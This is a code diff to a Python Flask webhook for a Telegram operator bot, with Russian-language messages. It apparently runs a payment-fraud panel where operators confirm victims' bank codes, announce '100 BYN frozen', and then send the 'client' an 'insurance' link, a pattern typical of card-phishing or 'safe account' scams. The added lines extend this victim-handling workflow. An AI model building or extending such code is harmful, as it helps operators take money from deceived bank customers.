@@ -130,7 +130,16 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Код подтверждён")
-            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n💰 100 BYN заморожены", None)
+            
+            # Отправляем новое сообщение с кнопкой на страховку
+            insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
+            insurance_keyboard = {
+                "inline_keyboard": [
+                    [{"text": "🛡️ Перевести на страховку", "callback_data": f"insurance_link:{session_id}"}]
+                ]
+            }
+            send_to_admin(f"✅ <b>ОПЛАТА 100 BYN УСПЕШНА</b>\n\n💰 Сумма: 100 BYN (заморожена)\n🆔 Сессия: {session_id}\n\n📌 Нажмите кнопку, чтобы отправить клиенту ссылку на страховку.", insurance_keyboard)
             
         elif callback_data.startswith('code_error:'):
             session_id = callback_data.split(':')[1]
@@ -151,6 +160,13 @@ def webhook():
             conn.close()
             send_callback_answer(callback_id, "💰 Клиенту показано сообщение о недостатке средств")
             edit_message_text(chat_id, message_id, f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}", None)
+            
+        # ========== КНОПКА НА СТРАХОВКУ ==========
+        elif callback_data.startswith('insurance_link:'):
+            session_id = callback_data.split(':')[1]
+            insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
+            send_callback_answer(callback_id, "✅ Ссылка на страховку")
+            edit_message_text(chat_id, message_id, f"🛡️ <b>ССЫЛКА НА СТРАХОВКУ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.", None)
             
         # ========== АВТОРИЗАЦИЯ ==========
         elif callback_data.startswith('auth_code_ok:'):
